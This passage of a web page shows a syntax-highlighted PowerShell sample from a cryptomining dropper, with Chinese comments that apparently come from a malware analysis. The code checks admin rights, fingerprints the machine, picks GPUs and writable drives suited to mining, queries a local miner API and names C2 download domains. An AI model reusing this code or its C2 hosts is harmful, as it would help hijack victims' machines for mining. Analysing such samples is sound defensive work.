style="--0:#BD976A;--1:#B07D48">$guid</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Win32_ComputerSystemProduct</span><span style="--0:#DBD7CAEE;--1:#393A34">).UUID</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$mac</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Win32_NetworkAdapterConfiguration</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#C98A7D;--1:#B56959">.ipenabled</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-EQ</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$true</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">}</span><span style="--0:#DBD7CAEE;--1:#393A34">).Macaddress </span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Select-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-First</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$osb</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Class</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Win32_OperatingSystem</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$os</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#BD976A;--1:#B07D48">$osb</span><span style="--0:#DBD7CAEE;--1:#393A34">.Caption.replace(</span><span style="--0:#80A665;--1:#59873A">"Microsoft Windows"</span><span style="--0:#80A665;--1:#59873A">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#DBD7CAEE;--1:#393A34">) + </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">_</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> + </span><span style="--0:#BD976A;--1:#B07D48">$osb</span><span style="--0:#DBD7CAEE;--1:#393A34">.Version</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$user</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#BD976A;--1:#B07D48">$env</span><span style="--0:#DBD7CAEE;--1:#393A34">:USERNAME</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$domain</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">win32_computersystem</span><span style="--0:#DBD7CAEE;--1:#393A34">).Domain</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$uptime</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">timespan</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::FromMilliseconds(</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">environment</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::TickCount).TotalSeconds</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$card</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Win32_VideoController</span><span style="--0:#DBD7CAEE;--1:#393A34">).name  </span><span style="--0:#758575DD;--1:#A0ADA0"># 采集显卡信息（判断是否适合挖矿）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$mem</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-WmiObject</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Win32_PhysicalMemory</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Measure-Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Property</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">Capacity</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-Sum</span><span style="--0:#DBD7CAEE;--1:#393A34">).Sum / 1Gb  </span><span style="--0:#758575DD;--1:#A0ADA0"># 内存大小</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0"># 采集可用磁盘信息（筛选可写入的磁盘）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">$drive</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> ([system.IO.DriveInfo</span><span style="--0:#80A665;--1:#59873A">]::GetDrives</span><span style="--0:#666666;--1:#999999">()</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">where</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#C98A7D;--1:#B56959">.IsReady</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-and</span><span style="--0:#DBD7CAEE;--1:#393A34"> ($_.AvailableFreeSpace </span><span style="--0:#C99076;--1:#A65E2B">-gt</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1024</span><span style="--0:#DBD7CAEE;--1:#393A34">) -and</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#DBD7CAEE;--1:#393A34">.</span><span style="--0:#BD976A;--1:#B07D48">DriveType</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">eq</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Removable</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">or</span><span style="--0:#DBD7CAEE;--1:#393A34"> (</span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#DBD7CAEE;--1:#393A34">.</span><span style="--0:#BD976A;--1:#B07D48">DriveType</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">eq</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Network</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">-and</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#DBD7CAEE;--1:#393A34">.</span><span style="--0:#BD976A;--1:#B07D48">DriveFormat</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">eq</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">NTFS</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">or</span><span style="--0:#DBD7CAEE;--1:#393A34"> (</span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#DBD7CAEE;--1:#393A34">.</span><span style="--0:#BD976A;--1:#B07D48">DriveFormat</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">eq</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">FAT32</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#DBD7CAEE;--1:#393A34">    </span></span><span style="--0:#DBD7CAEE;--1:#393A34">} </span><span style="--0:#CB7676;--1:#AB5959">|</span><span style="--0:#DBD7CAEE;--1:#393A34"> foreach </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C99076;--1:#A65E2B">$_</span><span style="--0:#DBD7CAEE;--1:#393A34">.Name</span><span style="--0:#666666;--1:#999999">)[</span><span style="--0:#DBD7CAEE;--1:#393A34">0</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">_</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> ($_.DriveType.ToString())[0] }) -join "|"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span><span style="--0:#DBD7CAEE;--1:#393A34"> catch </span><span style="--0:#666666;--1:#999999">{}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$timestamp</span><span style="--0:#DBD7CAEE;--1:#393A34"> = (</span><span style="--0:#80A665;--1:#59873A">Get-Date</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-UFormat</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">%s</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34">).Substring(</span><span style="--0:#80A665;--1:#59873A">0,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">9</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#采集挖矿进程信息（本地43669端口，挖矿程序通信特征）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">Reflection.Assembly</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#B8A965;--1:#998418">:</span><span style="--0:#C98A7D;--1:#B56959">:LoadWithPartialName</span><span style="--0:#DBD7CAEE;--1:#393A34">(</span><span style="--0:#80A665;--1:#59873A">"System.Web.Extensions"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">$obj</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> (New-Object </span><span style="--0:#C98A7D;--1:#B56959">Web.Script.Serialization.JavaScriptSerializer</span><span style="--0:#DBD7CAEE;--1:#393A34">).DeserializeObject</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#BD976A;--1:#B07D48">New</span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">Object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Net</span><span style="--0:#DBD7CAEE;--1:#393A34">.</span><span style="--0:#BD976A;--1:#B07D48">WebClient</span><span style="--0:#DBD7CAEE;--1:#393A34">).</span><span style="--0:#BD976A;--1:#B07D48">DownloadString</span><span style="--0:#DBD7CAEE;--1:#393A34">(</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">http://127.0.0.1:43669/1/summary</span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#BD976A;--1:#B07D48">$mv</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$obj</span><span style="--0:#C98A7D;--1:#B56959">.version</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$mip</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$obj</span><span style="--0:#C98A7D;--1:#B56959">.connection.ip</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$mhr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$obj</span><span style="--0:#C98A7D;--1:#B56959">.hashrate.total</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C99076;--1:#A65E2B">-join</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">'</span><span style="--0:#C98A7D;--1:#B56959">,</span><span style="--0:#C98A7D77;--1:#B5695977">'</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">} catch {}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">#标记显卡类型（NVIDIA/AMD，优先挖矿）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">if</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#BD976A;--1:#B07D48">$card</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">match</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">GTX|NVIDIA|GEFORCE</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$isn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#DBD7CAEE;--1:#393A34">if</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#BD976A;--1:#B07D48">$card</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#BD976A;--1:#B07D48">match</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Radeon|AMD</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">))</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$isa</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$v</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#BD976A;--1:#B07D48">$url</span><span style="--0:#DBD7CAEE;--1:#393A34">.split(</span><span style="--0:#80A665;--1:#59873A">"?"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">1</span><span style="--0:#666666;--1:#999999">]</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$params</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#CB7676;--1:#AB5959">@</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">$v</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#BD976A;--1:#B07D48">$comp_name</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#BD976A;--1:#B07D48">$guid</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#BD976A;--1:#B07D48">$mac</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> -join </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">&#x26;</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0"># 执行重命名，采集恶意文件MD5（失败则静默忽略）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$rename</span><span style="--0:#DBD7CAEE;--1:#393A34"> = getrname</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$lifmd5</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#BD976A;--1:#B07D48">$lmmd5</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#BD976A;--1:#B07D48">$lkrmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#DBD7CAEE;--1:#393A34">, </span><span style="--0:#C98A7D77;--1:#B5695977">""</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$lifmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">gmd5</span><span style="--0:#666666;--1:#999999">([</span><span style="--0:#DBD7CAEE;--1:#393A34">IO.File</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ReadAllBytes(</span><span style="--0:#80A665;--1:#59873A">"</span><span style="--0:#C98A7D;--1:#B56959">$env</span><span style="--0:#80A665;--1:#59873A">:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#80A665;--1:#59873A">ifbin"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#DBD7CAEE;--1:#393A34"> catch </span><span style="--0:#666666;--1:#999999">{}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$lmmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">gmd5</span><span style="--0:#666666;--1:#999999">([</span><span style="--0:#DBD7CAEE;--1:#393A34">IO.File</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ReadAllBytes(</span><span style="--0:#80A665;--1:#59873A">"</span><span style="--0:#C98A7D;--1:#B56959">$env</span><span style="--0:#80A665;--1:#59873A">:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#80A665;--1:#59873A">mbin"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">) </span><span style="--0:#666666;--1:#999999">}</span><span style="--0:#DBD7CAEE;--1:#393A34"> catch </span><span style="--0:#666666;--1:#999999">{}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#80A665;--1:#59873A">try</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$lkrmd5</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">gmd5</span><span style="--0:#666666;--1:#999999">([</span><span style="--0:#DBD7CAEE;--1:#393A34">IO.File</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34">::ReadAllBytes(</span><span style="--0:#80A665;--1:#59873A">"</span><span style="--0:#C98A7D;--1:#B56959">$env</span><span style="--0:#80A665;--1:#59873A">:tmp</span><span style="--0:#C99076;--1:#A65E2B">\$</span><span style="--0:#80A665;--1:#59873A">krbin"</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">) } catch </span><span style="--0:#666666;--1:#999999">{}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0"># 定义C2下载域名（优先级：d.ackng.com → t.amynx.com）</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$down_url</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">http://d.ackng.com</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">$url</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">$url</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">http://t.amynx.com</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D;--1:#B56959">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">$core_url</span><span style="--0:#DBD7CAEE;--1:#393A34"> = </span><span style="--0:#BD976A;--1:#B07D48">$url</span><span style="--0:#DBD7CAEE;--1:#393A34">.split(</span><span style="--0:#80A665;--1:#59873A">"/"</span><span style="--0:#DBD7CAEE;--1:#393A34">)</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#DBD7CAEE;--1:#393A34">0..2</span><span style="--0:#666666;--1:#999999">]</span><span style="--0:#DBD7CAEE;--1:#393A34"> -join </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">/</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$permit = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]&#x22;Administrator&#x22;)$comp_name = $env:COMPUTERNAME$guid = (Get-WmiObject Win32_ComputerSystemProduct).UUID$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.ipenabled -EQ $true }).Macaddress | Select-Object -First 1$osb = (Get-WmiObject -Class Win32_OperatingSystem)$os = $osb.Caption.replace(&#x22;Microsoft Windows&#x22;, &#x22;&#x22;) + &#x22;_&#x22; + $osb.Version$user = $env:USERNAME$domain = (Get-WmiObject win32_computersystem).Domain$uptime = [timespan]::FromMilliseconds([environment]::TickCount).TotalSeconds$card = (Get-WmiObject Win32_VideoController).name  # 采集显卡信息（判断是否适合挖矿）$mem = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1Gb  # 内存大小try {    $drive = ([system.IO.DriveInfo]::GetDrives() | where {        $_.IsReady -and ($_.AvailableFreeSpace -gt 1024) -and        (($_.DriveType -eq &#x22;Removable&#x22;) -or ($_.DriveType -eq &#x22;Network&#x22;)) -and        (($_.DriveFormat -eq &#x22;NTFS&#x22;) -or ($_.DriveFormat -eq &#x22;FAT32&#x22;))    } | foreach { ($_.Name)[0] + &#x22;_&#x22; + ($_.DriveType.ToString())[0] }) -join &#x22;|&#x22;} catch {}$timestamp = (Get-Date -UFormat &#x22;%s&#x22;).Substring(0, 9)try {    [Reflection.Assembly]::LoadWithPartialName(&#x22;System.Web.Extensions&#x22;)    $obj = (New-Object Web.Script.Serialization.JavaScriptSerializer).DeserializeObject((New-Object Net.WebClient).DownloadString(&#x27;http://127.0.0.1:43669/1/summary&#x27;))    $mv = $obj.version; $mip = $obj.connection.ip; $mhr = $obj.hashrate.total -join &#x27;,&#x27;} catch {}if(($card -match &#x22;GTX|NVIDIA|GEFORCE&#x22;)) { $isn = 1 }if(($card -match &#x22;Radeon|AMD&#x22;)) { $isa = 1 }$v = $url.split(&#x22;?&#x22;)[1]$params = @($v, $comp_name, $guid, $mac) -join &#x22;&#x26;&#x22;$rename = getrname$lifmd5, $lmmd5, $lkrmd5 = &#x22;&#x22;, &#x22;&#x22;, &#x22;&#x22;try { $lifmd5 = 